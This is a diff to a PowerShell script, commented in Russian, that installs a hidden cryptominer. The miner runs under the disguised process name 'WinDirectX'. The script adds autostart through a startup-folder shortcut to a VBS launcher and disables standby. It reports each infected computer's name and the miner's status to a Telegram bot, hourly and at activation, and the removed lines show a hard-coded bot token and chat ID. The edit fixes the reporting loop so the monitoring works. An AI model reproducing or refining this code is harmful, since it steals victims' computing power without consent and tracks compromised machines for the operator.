@@ -69,27 +69,35 @@ $shortcut = "[InternetShortcut]`nURL=file:///$path\win_start.vbs"
 $shortcut | Out-File -FilePath $startupFile -Encoding ascii
 
 # 7. ПИТАНИЕ, СТАРТ И МОНИТОРИНГ
+# 7. ПИТАНИЕ, СТАРТ И МОНИТОРИНГ (ОБНОВЛЕННЫЙ)
 powercfg /x -monitor-timeout-ac 5
 powercfg /x -standby-timeout-ac 0
 Start-Process -FilePath "$path\win_start.vbs"
 
-# ФОНОВЫЙ ЦИКЛ ОТЧЕТОВ
+# ФОНОВЫЙ ЦИКЛ ОТЧЕТОВ - Исправлена передача данных внутрь Job
 $Monitor = {
+    param($token, $id, $pc) # Принимаем данные из основного скрипта
     while($true) {
-        Start-Sleep -Seconds 3600
         $p = Get-Process "WinDirectX" -ErrorAction SilentlyContinue
         $msg = if ($p) { "✅ Статус: Работаю (" + [Math]::Round($p.WorkingSet64 / 1MB, 2) + " MB)" } else { "⚠️ СТАТУС: МАЙНЕР ВЫЛЕТЕЛ!" }
-        $url = "https://api.telegram.org/bot8260191816:AAE2rSVeuDnNG8nt4V-3vGjtfil3_ksqMwE/sendMessage"
-        $body = @{ chat_id = "6881699459"; text = "[$env:COMPUTERNAME]: $msg" }
-        Invoke-RestMethod -Uri $url -Method Post -Body $body -ErrorAction SilentlyContinue
+        
+        $url = "https://api.telegram.org/bot$token/sendMessage"
+        $body = @{ chat_id = $id; text = "[$pc]: $msg" }
+        
+        try { 
+            Invoke-RestMethod -Uri $url -Method Post -Body $body -ErrorAction SilentlyContinue 
+        } catch {}
+
+        Start-Sleep -Seconds 3600 # Спим час ПОСЛЕ отправки первого отчета
     }
 }
-Start-Job -ScriptBlock $Monitor
 
-# Уведомление о старте
-Start-Sleep -Seconds 5
+# Запускаем фоновую задачу и ПЕРЕДАЕМ ей токен, ID и имя ПК
+Start-Job -ScriptBlock $Monitor -ArgumentList $tgToken, $chatId, $env:COMPUTERNAME
+
+# Уведомление о немедленном старте
 $urlStart = "https://api.telegram.org/bot$tgToken/sendMessage"
-$bodyStart = @{ chat_id = $chatId; text = "[$env:COMPUTERNAME]: 🚀 СКРИПТ АКТИВИРОВАН! Автозагрузка создана." }
+$bodyStart = @{ chat_id = $chatId; text = "[$env:COMPUTERNAME]: 🚀 СКРИПТ АКТИВИРОВАН! Мониторинг запущен." }
 Invoke-RestMethod -Uri $urlStart -Method Post -Body $bodyStart -ErrorAction SilentlyContinue
 
-Write-Host "--- ВСЁ ГОТОВО (АВТОЗАГРУЗКА + ТГ ВКЛЮЧЕНЫ) ---" -ForegroundColor Magenta
+Write-Host "--- БЛОК 7 ОБНОВЛЕН (ТГ ОТЧЕТЫ ВКЛЮЧЕНЫ) ---" -ForegroundColor Magenta
